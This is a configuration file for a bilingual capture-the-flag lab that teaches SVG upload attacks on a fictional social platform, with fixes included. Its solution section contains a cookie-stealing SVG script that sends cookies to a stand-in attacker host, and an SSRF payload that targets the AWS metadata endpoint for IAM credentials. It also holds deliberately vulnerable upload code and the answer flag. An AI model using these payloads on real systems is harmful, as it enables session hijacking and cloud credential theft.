// src/modules/practice-labs/file-upload/labs/lab4/lab4.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const fuLab4Metadata: LabMetadata = {
  slug: 'fu-svg-xss-ssrf-social-platform',
  title: 'File Upload: SVG XSS + SSRF — Social Platform Profile Photo',
  ar_title:
    'رفع الملفات: SVG XSS + SSRF — صورة الملف الشخصي في المنصة الاجتماعية',
  description:
    "Exploit an SVG file upload vulnerability on a social platform. SVG files are XML-based and support JavaScript — upload an SVG with embedded XSS to steal admin session cookies, then exploit SVG's ability to load external resources for SSRF to access the internal cloud metadata API.",
  ar_description:
    'استغل ثغرة رفع SVG في منصة اجتماعية. ملفات SVG تعتمد على XML وتدعم JavaScript — ارفع SVG مع XSS مضمّن لسرقة session cookies، ثم استغل قدرة SVG على تحميل موارد خارجية لـ SSRF للوصول لـ cloud metadata API الداخلية.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'File Upload',
    'SVG XSS',
    'SSRF via SVG',
    'Stored XSS',
    'Cloud Metadata',
    'Content-Type Confusion',
  ],
  xpReward: 360,
  pointsReward: 180,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Upload an SVG with (1) embedded JS for stored XSS to steal admin cookies and (2) an <image href="http://169.254.169.254/..."> tag for SSRF to read cloud IAM credentials.',
  ar_goal:
    'ارفع SVG مع (1) JS مضمّن لـ stored XSS لسرقة admin cookies و(2) علامة <image href="http://169.254.169.254/..."> لـ SSRF لقراءة IAM credentials السحابية.',

  briefing: {
    en: `ConnectHub — social network. Profile photos. Public profiles.
POST /profile/photo/upload — accepts .jpg, .png, .gif, .svg.
SVG. That last one.
SVG is not a raster image. It's XML.
XML with a renderer. In the browser.
<svg><script>alert(1)</script></svg>
The browser renders it. The JavaScript executes.
Every user who views your profile runs your JavaScript.
Stored XSS. Via a "profile photo."
But there's more.
SVG can load external resources.
<image href="http://TARGET_URL" />
The browser fetches TARGET_URL.
Or the SERVER fetches it — if the server renders the SVG.
http://169.254.169.254/latest/meta-data/
That's the AWS EC2 metadata endpoint.
Only accessible from within the EC2 instance.
Your SVG asks the SERVER to fetch it.
Server-side request forgery.
The server fetches the metadata API.
Returns IAM credentials.
AccessKeyId. SecretAccessKey. SessionToken.
Full AWS cloud access.
Two attacks. One SVG file.`,
    ar: `ConnectHub — شبكة اجتماعية. صور شخصية. ملفات شخصية عامة.
POST /profile/photo/upload — يقبل .jpg، .png، .gif، .svg.
SVG. ذلك الأخير.
SVG ليست صورة نقطية. إنها XML.
XML مع renderer. في المتصفح.
<svg><script>alert(1)</script></svg>
المتصفح يُرندرها. JavaScript تُنفَّذ.
كل مستخدم يشاهد ملفك الشخصي يُشغّل JavaScript الخاص بك.
Stored XSS. عبر "صورة شخصية."
لكن هناك أكثر.
SVG يمكنه تحميل موارد خارجية.
<image href="http://TARGET_URL" />
المتصفح يجلب TARGET_URL.
أو الخادم يجلبها — إذا كان الخادم يُرندر الـ SVG.
http://169.254.169.254/latest/meta-data/
هذه هي نقطة نهاية AWS EC2 metadata.
متاحة فقط من داخل EC2 instance.
الـ SVG الخاص بك يطلب من الخادم جلبها.
Server-side request forgery.
الخادم يجلب metadata API.
يُعيد IAM credentials.
AccessKeyId. SecretAccessKey. SessionToken.
وصول كامل لـ AWS cloud.
هجومان. ملف SVG واحد.`,
  },

  stepsOverview: {
    en: [
      'POST /profile/photo/upload { "attackType": "xss" } — upload SVG with <script> for stored XSS',
      'POST /profile/photo/simulate-view { "viewerRole": "admin", "attackType": "xss" } → admin cookie stolen: "session=admin_tok_xyz"',
      'POST /profile/photo/upload { "attackType": "ssrf", "ssrfTarget": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" } — upload SVG with <image href=...> for SSRF',
      'POST /profile/photo/simulate-view { "viewerRole": "admin", "attackType": "ssrf" } → AWS IAM credentials returned',
      'Response contains AccessKeyId, SecretAccessKey, SessionToken + FLAG',
    ],
    ar: [
      'POST /profile/photo/upload { "attackType": "xss" } — ارفع SVG مع <script> لـ stored XSS',
      'POST /profile/photo/simulate-view { "viewerRole": "admin"، "attackType": "xss" } → admin cookie مسروقة: "session=admin_tok_xyz"',
      'POST /profile/photo/upload { "attackType": "ssrf"، "ssrfTarget": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" } — ارفع SVG مع <image href=...> لـ SSRF',
      'POST /profile/photo/simulate-view { "viewerRole": "admin"، "attackType": "ssrf" } → AWS IAM credentials مُعادة',
      'الاستجابة تحتوي على AccessKeyId، SecretAccessKey، SessionToken + FLAG',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'ConnectHub allows SVG uploads and serves them with Content-Type: image/svg+xml. The browser executes JS in SVG files. For SSRF: the server fetches external resources referenced in the SVG <image> tag when rendering server-side. The AWS metadata endpoint 169.254.169.254 is only accessible from within the EC2 instance — making it an internal SSRF target. Credentials returned include the FLAG.',
    vulnerableCode:
      "// Profile photo upload (vulnerable — SVG allowed):\napp.post('/profile/photo', upload.single('photo'), (req, res) => {\n" +
      '  const ext = path.extname(req.file.originalname);\n' +
      "  if (!['.jpg', '.png', '.gif', '.svg'].includes(ext)) { // ❌ SVG allowed!\n" +
      "    return res.status(400).json({ error: 'Invalid type' });\n" +
      '  }\n' +
      "  res.setHeader('Content-Type', 'image/svg+xml'); // ❌ Browser executes JS!\n" +
      '  res.send(req.file.buffer);\n' +
      '});',
    exploitation:
      'XSS SVG: <svg><script>document.location="http://attacker.io/steal?c="+document.cookie</script></svg>\n' +
      'SSRF SVG: <svg><image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"/></svg>\n' +
      '→ Admin views profile → cookie stolen + AWS IAM creds returned',
    steps: {
      en: [
        'POST /profile/photo/upload { "attackType": "xss" } → { "uploadedAs": "profile.svg", "svgContent": "<svg><script>...</script></svg>" }',
        'POST /profile/photo/simulate-view { "viewerRole": "admin", "attackType": "xss" } → { "stolenCookie": "session=admin_tok_xyz_456", "adminAccess": true }',
        'POST /profile/photo/upload { "attackType": "ssrf", "ssrfTarget": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" } → SVG with <image> tag uploaded',
        'POST /profile/photo/simulate-view { "viewerRole": "admin", "attackType": "ssrf" } → { "AccessKeyId": "ASIA_CONNECTHUB_PROD_XYZ", "SecretAccessKey": "...", "FLAG": "FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}" }',
      ],
      ar: [
        'POST /profile/photo/upload { "attackType": "xss" } → { "uploadedAs": "profile.svg"، "svgContent": "<svg><script>...</script></svg>" }',
        'POST /profile/photo/simulate-view { "viewerRole": "admin"، "attackType": "xss" } → { "stolenCookie": "session=admin_tok_xyz_456"، "adminAccess": true }',
        'POST /profile/photo/upload { "attackType": "ssrf"، "ssrfTarget": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" } → SVG مع علامة <image> مرفوع',
        'POST /profile/photo/simulate-view { "viewerRole": "admin"، "attackType": "ssrf" } → { "AccessKeyId": "ASIA_CONNECTHUB_PROD_XYZ"، "SecretAccessKey": "..."، "FLAG": "FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}" }',
      ],
    },
    fix: [
      'Never allow SVG uploads from untrusted users: SVG is code, not an image',
      'If SVG is required: sanitize with DOMPurify server-side, strip all <script>, event handlers, and external href/src references',
      'Serve uploads from a separate domain with no cookies: even if XSS runs, it cannot steal cookies from a different origin',
      "Block 169.254.169.254 at network level: AWS IMDSv2 requires a PUT request with a token — don't use IMDSv1; configure instance metadata service to require token",
    ],
  },

  postSolve: {
    explanation: {
      en: 'SVG files are XML documents, not binary images. When served as image/svg+xml, browsers parse and execute their content including JavaScript in <script> tags and event handlers (onload, onclick). This enables stored XSS via file upload — circumventing traditional XSS protections because the payload is inside an "image." The SSRF via SVG <image> tag exploits server-side SVG rendering: the server fetches the href URL, which can target internal services like AWS metadata, Redis, database admin panels, or other internal APIs unreachable from the internet.',
      ar: 'ملفات SVG هي مستندات XML، ليست صوراً ثنائية. عند تقديمها كـ image/svg+xml، تُحلّل المتصفحات محتواها وتُنفّذه بما في ذلك JavaScript في علامات <script> ومعالجات الأحداث (onload، onclick). هذا يُمكّن من stored XSS عبر رفع الملفات — متجاوزاً حمايات XSS التقليدية لأن الحمولة موجودة داخل "صورة." SSRF عبر علامة SVG <image> يستغل تقديم SVG من جانب الخادم: الخادم يجلب URL الـ href، والذي يمكنه استهداف الخدمات الداخلية مثل AWS metadata، Redis، لوحات admin لقواعد البيانات، أو APIs داخلية أخرى غير قابلة للوصول من الإنترنت.',
    },
    impact: {
      en: 'Dual impact: (1) XSS steals admin session cookie — full admin panel takeover, ability to delete users, access all DMs, export user data. (2) SSRF returns AWS IAM credentials: AccessKeyId + SecretAccessKey + Token for the ec2-role. These credentials grant whatever IAM permissions the role has — potentially S3 bucket access (all user photos/data), DynamoDB access, or even admin-level AWS permissions. The FLAG is embedded in the IAM credential response.',
      ar: 'تأثير مزدوج: (1) XSS تسرق admin session cookie — استيلاء كامل على لوحة admin، القدرة على حذف المستخدمين، الوصول لجميع الرسائل المباشرة، تصدير بيانات المستخدمين. (2) SSRF يُعيد AWS IAM credentials: AccessKeyId + SecretAccessKey + Token لـ ec2-role. هذه البيانات تمنح أياً من صلاحيات IAM للدور — ربما وصول لـ S3 bucket (جميع صور/بيانات المستخدمين)، وصول DynamoDB، أو حتى صلاحيات AWS على مستوى admin. الـ FLAG مضمّن في استجابة IAM credential.',
    },
    fix: [
      'Block SVG uploads OR sanitize: use svg-sanitizer to remove <script>, JS event handlers, and external references',
      'Serve from isolated domain: uploads.connecthub.io (no cookies) — XSS cannot steal cookies from different origin',
      "CSP header: Content-Security-Policy: default-src 'none' — SVG scripts cannot execute without CSP allowance",
      'IMDSv2: configure EC2 to require PUT + token for metadata access — simple GET to 169.254.169.254 will return 401',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'SVG is XML. XML supports <script> tags. If a browser renders an SVG served as image/svg+xml, it EXECUTES embedded JavaScript — stored XSS on every profile viewer.',
    },
    {
      order: 2,
      xpCost: 50,
      content:
        'SVG also supports <image href="URL">. The SERVER fetches that URL when rendering. What if it\'s http://169.254.169.254/latest/meta-data/? That\'s the AWS EC2 metadata endpoint — only reachable internally.',
    },
    {
      order: 3,
      xpCost: 80,
      content:
        'POST /profile/photo/upload with { "attackType": "ssrf", "ssrfTarget": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" }. The server builds an SVG with an <image> tag pointing to that URL.',
    },
    {
      order: 4,
      xpCost: 110,
      content:
        'POST /profile/photo/simulate-view with { "viewerRole": "admin", "attackType": "ssrf" } to trigger the SVG render and get the AWS IAM credentials + flag returned in the response.',
    },
  ],

  flagAnswer: 'FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}',
  initialState: {
    contents: [
      {
        title: 'AWS_IAM_CREDS',
        body: JSON.stringify(
          {
            Code: 'Success',
            AccessKeyId: 'ASIA_CONNECTHUB_PROD_XYZ',
            SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            Token: 'token_connecthub_prod_session_abc123',
            FLAG: 'FLAG{FILE_UPLOAD_SVG_XSS_SSRF_CLOUD_METADATA_IAM_CREDS}',
          },
          null,
          2,
        ),
        author: 'aws_metadata',
        isPublic: false,
      },
    ],
  },
};
